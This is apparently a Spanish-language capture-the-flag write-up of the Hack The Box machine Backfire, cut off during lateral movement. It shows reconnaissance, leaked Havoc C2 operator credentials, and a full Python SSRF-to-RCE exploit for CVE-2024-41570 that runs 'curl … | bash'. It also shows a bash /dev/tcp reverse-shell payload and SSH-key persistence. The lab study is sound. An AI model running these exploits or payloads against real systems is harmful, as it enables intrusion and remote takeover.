---
hidden: true
noIndex: true
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Copy of tester

<figure><img src="../../.gitbook/assets/Backfire.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`Backfire`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.49 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 19:36 CET
Initiating SYN Stealth Scan at 19:36
Scanning 10.10.11.49 [65535 ports]
Discovered open port 443/tcp on 10.10.11.49
Discovered open port 22/tcp on 10.10.11.49
Discovered open port 8000/tcp on 10.10.11.49
Completed SYN Stealth Scan at 19:37, 11.29s elapsed (65535 total ports)
Nmap scan report for 10.10.11.49
Host is up, received user-set (0.033s latency).
Scanned at 2025-01-20 19:36:58 CET for 11s
Not shown: 65530 closed tcp ports (reset), 2 filtered tcp ports (port-unreach)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
443/tcp  open  https    syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.38 seconds
           Raw packets sent: 65572 (2.885MB) | Rcvd: 65580 (2.624MB)

```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.49
	[*] Open ports: 22,443,8000

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de dos páginas de `Nginx` (puerto 443 y 8000) y el servicio`SSH`.

```bash
❯ nmap -sCV -p22,443,8000 10.10.11.49 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 09:29 CET
Nmap scan report for backfire.htb (10.10.11.49)
Host is up (0.054s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open  ssl/http nginx 1.22.1
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
|_http-server-header: nginx/1.22.1
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=DEBUG CO/stateOrProvinceName=/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Not valid before: 2024-02-09T02:59:49
|_Not valid after:  2027-02-08T02:59:49
8000/tcp open  http     nginx 1.22.1
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 11:31  disable_tls.patch
| 875   17-Dec-2024 11:34  havoc.yaotl
|_
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.22.1
|_http-title: Index of /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   80.81 ms 10.10.16.1
2   28.38 ms backfire.htb (10.10.11.49)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.45 secondsBAS
```

Procederemos a transformar el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/3969_vmware_dFPPcDbcDT.png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Revisando la página web de [https://10.10.11.49](https://10.10.11.49), verificamos que nos carga una página con un error de `404 Not Found` de `Nginx`.

<figure><img src="../../.gitbook/assets/imagen (203).png" alt=""><figcaption></figcaption></figure>

Revisando la página web de [http://10.10.11.49:8000](http://10.10.11.49:8000), nos encontramos con dos archivos, los descargaremos para verificar el contenido de estos.

<figure><img src="../../.gitbook/assets/imagen (204).png" alt=""><figcaption></figcaption></figure>

El archivo `disable_tls.patch` aplica cambios para deshabilitar TLS en las conexiones WebSocket del puerto de gestión 40056. Según los comentarios, el objetivo es probar que "sergej no está trabajando". Aclaran que el puerto solo permite conexiones locales mediante tunelización SSH, por lo que, según ellos, esto no comprometería la seguridad del servidor.

```bash
❯ cat disable_tls.patch
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
 		}
 
 		// start the teamserver
-		if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+		if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
 			logger.Error("Failed to start websocket: " + err.Error())
 		}
```

El archivo `havoc.yaotl` es una configuración para un equipo que utiliza el framework Havoc. Este archivo contiene información clave sobre la configuración del **teamserver**, las credenciales de los operadores, la configuración de los demonios y los listeners. El TeamServer se encuentra en un puerto interno 40056.

{% hint style="info" %}
**Havoc C2** es un framework de **Command and Control (C2)** que se utiliza comúnmente en operaciones de **red team** o **penetration testing**. Este tipo de herramientas permiten a los pentesters y actores malintencionados comunicarse con sistemas comprometidos para realizar exfiltración de datos, ejecución remota de comandos, control persistente, entre otras actividades.
{% endhint %}

```bash
❯ cat havoc.yaotl
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
```

## Initial Access

### Exploitation SSRF HavocC2 - (CVE-2024-41570)

Durante la fase de investigación, identificamos una vulnerabilidad en HavocC2 relacionada con un **SSRF (Server Side Request Forgery)**, documentada en el `CVE-2024-41570`. Para explorarla, utilizamos el siguiente repositorio público que contiene una prueba de concepto (PoC):

{% embed url="https://github.com/chebuya/Havoc-C2-SSRF-poc" %}

Según el blog del creador de la PoC, la vulnerabilidad permite explotar una solicitud maliciosa para interactuar con recursos internos del servidor, lo que potencialmente puede revelar información sensible, como direcciones IP internas o servicios en ejecución.

{% embed url="https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/" %}

En este caso, nos clonamos el proyecto en nuestro equipo local.

```bash
❯ git clone https://github.com/chebuya/Havoc-C2-SSRF-poc; cd Havoc-C2-SSRF-poc
Clonando en 'Havoc-C2-SSRF-poc'...
remote: Enumerating objects: 39, done.
remote: Counting objects: 100% (39/39), done.
remote: Compressing objects: 100% (35/35), done.
remote: Total 39 (delta 10), reused 0 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (39/39), 14.83 KiB | 460.00 KiB/s, listo.
Resolviendo deltas: 100% (10/10), listo.
```

Levantamos un servidor HTTP local para recibir las solicitudes provenientes de la explotación del SSRF.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Utilizamos el script `exploit.py` de la PoC para interactuar con el equipo objetivo y tratar de descubrir información interna.

```bash
❯ python3 exploit.py -t https://10.10.11.49 -i 10.10.16.5 -p 80
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
HTTP/1.0 404 File not found
Server: SimpleHTTP/0.6 Python/3.12.8
Date: Tue, 21 Jan 2025 08:43:01 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 335

<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
```

Aunque el exploit se ejecutó correctamente, la solicitud realizada al servidor no reveló información adicional relevante. En lugar de una dirección IP interna, recibimos la respuesta HTTP estándar `404 File not found`.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.49 - - [21/Jan/2025 09:43:01] code 404, message File not found
10.10.11.49 - - [21/Jan/2025 09:43:01] "GET /vulnerable HTTP/1.1" 404 -
```

### Creating a Python Script to exploit SSRF-RCE on the machine

Con la ayuda de ChatGPT, creamos el siguiente script en Python que aprovecha una vulnerabilidad de **SSRF** para lograr un **RCE**, adaptándose a las configuraciones observadas en el sistema objetivo. A continuación, se detalla su funcionamiento:

**Registro del Agente**

La función `register_agent` envía una solicitud cifrada con información del host comprometido, incluyendo nombre del usuario, IP interna y detalles del proceso. Esto registra al agente malicioso en el sistema.

**Comunicación mediante WebSocket**

Se establece un WebSocket autenticado utilizando las credenciales `ilya:CobaltStr1keSuckz!`. Posteriormente, se configura un listener para recibir conexiones del sistema objetivo.

**Construcción del Payload SSRF-RCE**

El payload malicioso utiliza la siguiente cadena para ejecutar comandos arbitrarios en el servidor

{% code title="SSRF-RCE.py" %}
```python
import os
import json
import hashlib
import binascii
import random
import requests
import argparse
import urllib3
urllib3.disable_warnings()

from Crypto.Cipher import AES
from Crypto.Util import Counter

USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"

key_bytes = 32

def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext

def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)

def encrypt(key, iv, plaintext):

    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"

        assert len(key) == key_bytes

        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        ciphertext = aes.encrypt(plaintext)
        return ciphertext

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data =  b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent ...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")

def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"

    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"

    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"
    
    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to open socket on the teamserver ...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")

def write_socket(socket_id, data, message):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"

    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"

    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print(message)
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed - {r.status_code} {r.text}")

def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to poll teamserver for socket output ...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""

    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]
    
def create_websocket_request(HOST, PORT):
	request = ( 
		f"GET /havoc/ HTTP/1.1\r\n"
		f"Host: {HOST}:{PORT}\r\n"
		f"Upgrade: websocket\r\n"
		f"Connection: Upgrade\r\n"
		f"Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n"
		f"Sec-WebSocket-Version: 13\r\n"
		f"\r\n"
	).encode()
	return request
	
def build_websocket_frame(payload):
	payload_bytes = payload.encode("utf-8")
	frame = bytearray()
	frame.append(0x81)
	payload_length = len(payload_bytes)
	if payload_length <= 125:
		frame.append(0x80 | payload_length)
	elif payload_length <= 65535:
		frame.append(0x80 | 126)
		frame.extend(payload_length.to_bytes(2, byteorder="big"))
	else:
		frame.append(0x80 | 127)
		frame.extend(payload_length.to_bytes(8, byteorder="big"))

	masking_key = os.urandom(4)
	frame.extend(masking_key)
	masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
	frame.extend(masked_payload)
	return frame

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")

args = parser.parse_args()

# 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
        "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))
ip = args.ip
port = args.port

#register agent
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

#open socket
socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

#authenticate to teamserver
message="[***] Establishing connection to teamserver ..."
websocket_request = create_websocket_request(ip, port)
write_socket(socket_id, websocket_request,message)

message="[***] Authenticating to teamserver ..."
payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame,message)

#create listener
message="[***] Creating Listener ..."
payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame, message)

#SSRF payload (comand injection)
message="[***] Injecting Command ..."
cmd = "curl http://10.10.16.5:8080/payload.sh | bash" #CHANGE ME
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n \"Amsi/Etw Patch\": \"None\",\n \"Indirect Syscall\": false,\n \"Injection\": {\n \"Alloc\": \"Native/Syscall\",\n \"Execute\": \"Native/Syscall\",\n \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n },\n \"Jitter\": \"0\",\n \"Proxy Loading\": \"None (LdrLoadDll)\",\n \"Service Name\":\"" + injection + "\",\n \"Sleep\": \"2\",\n \"Sleep Jmp Gadget\": \"None\",\n \"Sleep Technique\": \"WaitForSingleObjectEx\",\n \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
"Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame,message)
```
{% endcode %}

Crearemos nuestro archivo `payload.sh` el cual ejecuta una Reverse Shell hacía nuestro equipo. Lo compartiremos a través de un servidor web por el puerto especificado en el exploit.

```bash
❯ cat payload.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.5/444 0>&1'

❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Por otro lado, nos pondremos en escucha por el puerto indicado en la Reverse Shell.

```bash
❯ nc -nlvp 444
listening on [any] 444 ...
```

Al ejecutar el `exploit.py` modificado, le indicaremos el `target` el cual será el objetivo https://10.10.11.49 y la dirección y puertos internos del WebSocket que encontramos en la configuración de `HavocC2`.

```bash
❯ python3 SSRF.py --target https://10.10.11.49 -i 127.0.0.1 -p 40056
[***] Trying to register agent ...
[***] Success!
[***] Trying to open socket on the teamserver ...
[***] Success!
[***] Establishing connection to teamserver ...
[***] Success!
[***] Authenticating to teamserver ...
[***] Success!
[***] Creating Listener ...
[***] Success!
[***] Injecting Command ...
[***] Success!
```

Verificamos que hemos logrado explotar la vulnerabilidad de SSRF combinaco con el rce para obtener acceso al equipo. Logramos verificar la flag de **user.txt**.

```bash
❯ nc -nlvp 444
listening on [any] 444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.49] 60062
bash: cannot set terminal process group (2798): Inappropriate ioctl for device
bash: no job control in this shell
ilya@backfire:~/Havoc/payloads/Demon$ whoami
ilya
ilya@backfire:~/Havoc/payloads/Demon$ cat /home/ilya/user.txt
f5448999f2**********************
```

### Uploading our public SSH key to the machine to connect with SSH

La Shell que hemos recibido, por un motivo u otro era bastante inestable y se cerraba al poco tiempo.&#x20;

Por lo tanto, lo que decidimos es subir nuestra clave pública SSH al equipo para conectarnos mediante SSH sin proporcionar credenciales.

En nuestro equipo atacante, generaremos unas nuevas claves SSH.

```bash
❯ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): 
Enter passphrase for "/home/kali/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_ed25519
Your public key has been saved in /home/kali/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:L6LVCWep/EmLWtMMKME0I6CwJD99okkUpUfupYDD6LI kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|*.*oo            |
|BO B             |
|*.O = o          |
|.o O *   .       |
|..+ + o S        |
|.. . . X o       |
|E     B B .      |
|     + * +       |
|    o.. +        |
+----[SHA256]-----+
```

Revisaremos el contenido de nuestra clave SSH pública.

```bash
❯ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali
```

Estando conectados en el equipo víctima, navegaremos al directorio `/home/ilya/.ssh` para añadir nuestra clave pública en el archivo `authorized_keys`.

```bash
ilya@backfire:~/Havoc/payloads/Demon$ cd /home/ilya/.ssh/
cd /home/ilya/.ssh/
ilya@backfire:~/.ssh$ ls -l
ls -l
total 4
-rw-r--r-- 1 ilya ilya 1 Dec 17 11:36 authorized_keys
ilya@backfire:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali' >> authorized_keys
<xygCF1kT7UbFMFfVqiyz0 kali@kali' >> authorized_keys
ilya@backfire:~/.ssh$ cat authorized_keys
cat authorized_keys

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINchj1ycZWUZctrUZl/nhPPxygCF1kT7UbFMFfVqiyz0 kali@kali
```

Desde nuestro equipo atacante, nos conectaremos mediante SSH al equipo víctima con el usuario `ilya` y verificaremos que no nos requiere de credenciales de acceso.

```bash
❯ ssh ilya@10.10.11.49
The authenticity of host '10.10.11.49 (10.10.11.49)' can't be established.
ED25519 key fingerprint is SHA256:vKC7A11sFxQLRppUMt01q0d/DPREoskH4Aa42t0Bz9M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.49' (ED25519) to the list of known hosts.
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
ilya@backfire:~$
```

## Lateral Movement

### Reviewing services on the machine and detecting running HardHat 2 services

Revisando el directorio de `ilya`, nos encontramos con el siguiente archivo `hardhat.txt` el cual informa que el usuario `sergej` dice haber instalado `HardHatC2` para realizar pruebas y que no realizó ningún cambio a las configuraciones por defecto. También indica que espera que haya escogido el C2 de `Havoc` en vez del mencionado.

```bash
ilya@backfire:~$ ls -l
total 16
drwxr-xr-x  2 root root 4096 Sep 30 07:39 files
-rw-r--r--  1 root root  174 Sep 28 23:02 hardhat.txt
drwxr-xr-x 10 ilya ilya 4096 Sep 27 19:18 Havoc
-rw-r-----  1 root ilya   33 Jan 20 22:00 user.txt
ilya@backfire:~$ cat hardhat.txt 
Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C# 
```

Buscamos información sobre `HardHat C2`, nos encontramos con el repositorio del framework en el cual nos informan de las características, configuraciones y demás. Entre la información obtenida del repositorio del framework, nos informa que normalmente utiliza los puertos `5000` y `7096`.

{% hint style="info" %}
**HerdHat C2** es un framework o plataforma utilizada en el ámbito de **penetration testing** o **red teaming** para la **gestión y ejecución de ataques** mediante **Command and Control (C2)**. Se basa en permitir el **comando y control remoto** sobre sistemas comprometidos, proporcionando capacidades avanzadas para persistencia, exfiltración de datos, ejecución remota de comandos, y otros tipos de interacciones maliciosas.
{% endhint %}

{% embed url="https://github.com/DragoQCC/HardHatC2" %}

Al verificar los puertos internos que se encuentran en ejecución en el equipo víctima, verificamos que estos puertos están abiertos de manera interna. Lo cual nos hace pensar que el framework de `HardHat C2` se encuentra activo.

```bash
ilya@backfire:~$ netstat -ano | grep "LISTEN"
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:7096            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:40056         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
```

Revisando los procesos activos, verificamos que el usuario `sergej` es el que está levantando este framework.

```bash
ilya@backfire:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
sergej      3697  3.2  6.7 274271152 269652 ?    Ssl  23:10   0:09 /home/sergej/.dotnet/dotnet run --project HardHatC2Client --configuration Release
sergej      3698  1.4  6.3 274262800 252476 ?    Ssl  23:10   0:04 /home/sergej/.dotnet/dotnet run --project TeamServer --configuration Release
sergej      3755  1.4  3.1 274204428 123208 ?    Sl   23:10   0:04 /home/sergej/HardHatC2/TeamServer/bin/Release/net7.0/TeamServer
sergej      3777  1.0  3.1 274194936 125060 ?    Sl   23:10   0:02 /home/sergej/HardHatC2/HardHatC2Client/bin/Release/net7.0/HardHatC2Client
```

Por otro lado, verificamos a través de los siguientes comandos que efectivamente el servicio se encuentre en ejecución.

```bash
ilya@backfire:/etc/systemd/system$ systemctl status hardhat_server
● hardhat_server.service - hardhat_server
     Loaded: loaded (/etc/systemd/system/hardhat_server.service; enabled; preset: enabled)
     Active: active (running) since Mon 2025-01-20 23:10:02 EST; 8min ago
   Main PID: 3698 (dotnet)
      Tasks: 43 (limit: 4602)
     Memory: 226.8M
        CPU: 8.897s
     CGroup: /system.slice/hardhat_server.service
             ├─3698 /home/sergej/.dotnet/dotnet run --project TeamServer --configuration Release
